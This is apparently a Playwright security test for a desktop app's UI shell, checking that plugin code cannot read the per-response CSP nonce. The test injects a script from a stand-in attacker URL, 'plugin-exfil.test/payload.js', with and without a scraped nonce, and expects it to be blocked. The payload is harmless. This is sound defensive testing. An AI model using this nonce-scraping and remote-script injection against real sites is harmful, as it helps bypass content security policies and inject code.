/**
 * archive#4287 — the shell's CSP nonce must not be reachable from page code.
 *
 * This exercises the POLICY, not the header string. jsdom enforces no CSP and
 * never loads an external script, so the property "a plugin bundle cannot mint
 * a nonce'd remote script" is only falsifiable in a real browser against the
 * real per-response header, which is why it lives here.
 *
 * Each check is run twice, once with the nonce lifted straight out of the
 * response header. That control is the test's power: it proves the policy DOES
 * admit an undeclared remote script to anything holding the nonce, so the
 * refusal below is the leak being closed rather than a URL the policy would
 * have refused anyway.
 */
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { expect, type Page, test } from '@playwright/test';
import { build } from 'esbuild';
import {
  buildUiBootstrapScript,
  UI_MIME_TYPES,
  UI_PROXY_BACKEND_PREFIXES,
  uiRequestHandler,
} from '../packages/cli/src/commands/lifecycle';

const REMOTE_SCRIPT_URL = 'https://plugin-exfil.test/payload.js';
const API_BASE_OVERRIDE = 'http://127.0.0.1:9/';

const servers: http.Server[] = [];
let defaultOrigin: string;
let overrideOrigin: string;
let registryHarness: string;

async function startUiServer(inject: string): Promise<string> {
  const upstream = http.createServer((_req, res) => {
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end('{}');
  });
  await new Promise<void>((resolve) =>
    upstream.listen(0, '127.0.0.1', resolve),
  );
  servers.push(upstream);
  const upstreamAddress = upstream.address();
  const upstreamPort =
    typeof upstreamAddress === 'object' && upstreamAddress
      ? upstreamAddress.port
      : 0;
  const ui = http.createServer(
    uiRequestHandler({
      http,
      crypto,
      fs,
      path,
      dir: process.env.STATION_E2E_UI_DIR || path.resolve('dist-ui'),
      mime: UI_MIME_TYPES,
      inject,
      upstreamPort,
      backendPrefixes: UI_PROXY_BACKEND_PREFIXES,
      internalApiToken: 'playwright-only-internal-token',
    }),
  );
  await new Promise<void>((resolve) => ui.listen(0, '127.0.0.1', resolve));
  servers.push(ui);
  const address = ui.address();
  const port = typeof address === 'object' && address ? address.port : 0;
  return `http://127.0.0.1:${port}`;
}

/** Everything a script running in this document could use as a nonce. */
async function scrapeNonceCandidates(page: Page): Promise<string[]> {
  return page.evaluate(() => {
    const carriers = [
      (window as unknown as { __STATION_CSP_NONCE__?: unknown })
        .__STATION_CSP_NONCE__,
      // Nonce hiding blanks the content attribute but leaves the IDL property,
      // so the DOM walk has to read `.nonce`, not `getAttribute('nonce')`.
      ...Array.from(document.querySelectorAll('script')).map(
        (element) => element.nonce,
      ),
      ...Array.from(document.querySelectorAll('script[nonce]')).map((element) =>
        element.getAttribute('nonce'),
      ),
    ];
    return carriers.filter(
      (value): value is string =>
        typeof value === 'string' &&
        value.length > 0 &&
        // The desktop marker's un-replaced placeholder is not a nonce.
        value !== '__TAURI_SCRIPT_NONCE__',
    );
  });
}

async function loadRemoteScript(
  page: Page,
  nonce: string | null,
): Promise<{ ran: boolean; violatedDirectives: string[] }> {
  return page.evaluate(
    async ({ url, nonce: candidate }) => {
      const violatedDirectives: string[] = [];
      const record = (event: SecurityPolicyViolationEvent) => {
        if (event.blockedURI.startsWith('https://plugin-exfil.test')) {
          violatedDirectives.push(event.violatedDirective);
        }
      };
      document.addEventListener('securitypolicyviolation', record);
      const flag = `__remote_payload_ran_${Date.now()}`;
      const script = document.createElement('script');
      script.src = `${url}?flag=${flag}`;
      if (candidate !== null) script.nonce = candidate;
      const settled = new Promise<void>((resolve) => {
        script.addEventListener('load', () => resolve());
        script.addEventListener('error', () => resolve());
        setTimeout(resolve, 5_000);
      });
      document.head.appendChild(script);
      await settled;
      document.removeEventListener('securitypolicyviolation', record);
      script.remove();
      return {
        ran:
          (window as unknown as Record<string, unknown>)
            .__remote_payload_ran === true,
        violatedDirectives,
      };
    },
    { url: REMOTE_SCRIPT_URL, nonce },
  );
}

function nonceFromPolicy(policy: string | undefined): string {
  const match = /'nonce-([^']+)'/.exec(policy ?? '');
  if (!match?.[1]) throw new Error(`no nonce in policy: ${policy}`);
  return match[1];
}

test.beforeAll(async () => {
  const result = await build({
    stdin: {
      contents: `
        import { PluginRegistry } from './src-ui/src/core/PluginRegistry';
        const registry = new PluginRegistry(Promise.resolve({ platform: 'tauri' }));
        registry.setApiBase(new URL(location.href).searchParams.get('apiBase') || location.origin);
        registry.reload().then(state => {
          document.body.dataset.state = state;
          document.body.dataset.failure = registry.getLoadStatus().failure || '';
          document.body.dataset.failedPlugins = registry.getLoadStatus().failedPluginNames.join(',');
          document.body.dataset.registered = String(registry.hasLayout('csp-pane'));
        });
      `,
      resolveDir: process.cwd(),
      loader: 'ts',
    },
    bundle: true,
    format: 'iife',
    platform: 'browser',
    write: false,
    tsconfig: 'src-ui/tsconfig.json',
    loader: { '.css': 'empty', '.svg': 'dataurl', '.woff2': 'dataurl' },
    define: { 'process.env.NODE_ENV': '"production"', 'import.meta.env': '{}' },
  });
  registryHarness = result.outputFiles[0].text;
  defaultOrigin = await startUiServer(buildUiBootstrapScript({}));
  overrideOrigin = await startUiServer(
    buildUiBootstrapScript({ apiBaseOverride: API_BASE_OVERRIDE }),
  );
});

test.afterAll(async () => {
  await Promise.all(
    servers.map(
      (server) => new Promise<void>((resolve) => server.close(() => resolve())),
    ),
  );
});

test.beforeEach(async ({ page }) => {
  await page.route(`${REMOTE_SCRIPT_URL}**`, (route) =>
    route.fulfill({
      status: 200,
      contentType: 'application/javascript',
      body: 'window.__remote_payload_ran = true;',
    }),
  );
});

test('the shell publishes no nonce a plugin bundle could read back', async ({
  page,
}) => {
  const response = await page.goto(defaultOrigin);
  const policy = response?.headers()['content-security-policy'];
  expect(policy).toContain("script-src 'self' 'nonce-");

  expect(await scrapeNonceCandidates(page)).toEqual([]);

  const withoutNonce = await loadRemoteScript(page, null);
  expect(withoutNonce.ran).toBe(false);
  expect(withoutNonce.violatedDirectives.join(' ')).toContain('script-src');

  // The control: the nonce still admits an undeclared remote script, so the
  // refusal above is the value being withheld, not a policy that never had it.
  const withNonce = await loadRemoteScript(page, nonceFromPolicy(policy));
  expect(withNonce.ran).toBe(true);
  expect(withNonce.violatedDirectives).toEqual([]);
});

test('the API-base bootstrap runs and then removes its nonce-bearing element', async ({
  page,
}) => {
  await page.goto(overrideOrigin);

  // It ran...
  await expect
    .poll(() =>
      page.evaluate(
        () =>
          (window as unknown as { __API_BASE__?: string }).__API_BASE__ ?? null,
      ),
    )
    .toBe(API_BASE_OVERRIDE);

  // ...and it is gone. Both halves matter: an element that stayed would keep
  // publishing the response nonce through its `nonce` IDL property.
  expect(await scrapeNonceCandidates(page)).toEqual([]);

  const withoutNonce = await loadRemoteScript(page, null);
  expect(withoutNonce.ran).toBe(false);
  expect(withoutNonce.violatedDirectives.join(' ')).toContain('script-src');
});

// Isolate the real registry from app boot while retaining the production
// response policy. No loader or shared-runtime dependency is replaced.
test.describe('plugin bundle loader under the shell CSP', () => {
  for (const crossOrigin of [false, true]) {
    test(`${crossOrigin ? 'refuses cross-origin bytes' : 'loads same-origin bytes'} without a plugin nonce`, async ({
      page,
    }) => {
      let bundleRequests = 0;
      let cssRequests = 0;
      let inventoryRequests = 0;
      await page.route('**/api/plugins', (route) => {
        inventoryRequests += 1;
        return route.fulfill({
          headers: { 'access-control-allow-origin': defaultOrigin },
          json: {
            plugins: [
              { name: 'csp-plugin', version: '1.0.0', hasBundle: true },
            ],
          },
        });
      });
      await page.route('**/bundle.css', (route) => {
        cssRequests += 1;
        return route.fulfill({
          body: '',
          contentType: 'text/css',
          headers: { 'access-control-allow-origin': defaultOrigin },
        });
      });
      await page.route('**/bundle.js', (route) => {
        bundleRequests += 1;
        return route.fulfill({
          headers: { 'access-control-allow-origin': defaultOrigin },
          contentType: 'application/javascript',
          body: `
          window.__station_ai_plugins = { 'csp-plugin': { components: { 'csp-pane': () => null } } };
        `,
        });
      });
      await page.route(`${defaultOrigin}/registry-harness.js`, (route) =>
        route.fulfill({
          body: registryHarness,
          contentType: 'application/javascript',
        }),
      );
      await page.route(`${defaultOrigin}/?loader**`, async (route) => {
        const response = await route.fetch();
        const nonce = nonceFromPolicy(
          response.headers()['content-security-policy'],
        );
        await route.fulfill({
          response,
          body: `<html><head><script data-station-csp-nonce nonce="${nonce}"></script><script src="/registry-harness.js" defer></script></head><body></body></html>`,
        });
      });
      const apiBase = crossOrigin ? overrideOrigin : defaultOrigin;
      await page.goto(
        `${defaultOrigin}/?loader=1&apiBase=${encodeURIComponent(apiBase)}`,
      );
      await expect(page.locator('body')).toHaveAttribute(
        'data-state',
        crossOrigin ? 'degraded' : 'ready',
      );
      await expect(page.locator('body')).toHaveAttribute(
        'data-registered',
        String(!crossOrigin),
      );
      await expect(page.locator('body')).toHaveAttribute(
        'data-failure',
        crossOrigin ? 'bundle-load-failure' : '',
      );
      await expect(page.locator('body')).toHaveAttribute(
        'data-failed-plugins',
        crossOrigin ? 'csp-plugin' : '',
      );
      expect(inventoryRequests).toBe(1);
      expect(cssRequests).toBe(1);
      const scripts = page.locator('script[data-station-plugin]');
      await expect(scripts).toHaveCount(crossOrigin ? 0 : 1);
      expect(
        await scripts.evaluateAll((nodes) =>
          nodes.map((node) => ({
            nonce: node.nonce,
            hasNonce: node.hasAttribute('nonce'),
          })),
        ),
      ).toEqual(crossOrigin ? [] : [{ nonce: '', hasNonce: false }]);
      expect(bundleRequests).toBe(crossOrigin ? 0 : 1);
    });
  }
});
